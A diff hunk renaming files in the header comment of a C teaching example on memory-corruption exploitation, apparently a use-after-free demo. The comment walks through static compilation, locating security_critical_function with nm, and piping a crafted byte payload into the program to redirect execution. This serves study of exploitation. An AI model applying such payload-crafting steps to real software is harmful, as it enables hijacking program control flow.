@@ -1,16 +1,16 @@
 /* THis example is a bit less complicated than the stack smashing one.
  * First you need to compile the executable statically to have a deterministic
  * and easy to identify address for security_critical_function:
- * gcc listing4.c -g -o listing4 -static
+ * gcc use-after-free.c -g -o use-after-free -static
  *
  * then use nm to find that address:
- * nm listing4 | grep security_critical_function
+ * nm use-after-free | grep security_critical_function
  *
  * on my computer I get:
  * 0000000000401bc1 T security_critical_function
  *
  * Then we can craft and inject our payload:
- * echo -e "\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\xb1\x1c\x40\x00\x00\x00\x00\x00" | xargs --null -t -n1 ./listing4
+ * echo -e "\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\xb1\x1c\x40\x00\x00\x00\x00\x00" | xargs --null -t -n1 ./use-after-free
  */
 
 #include <stdio.h>
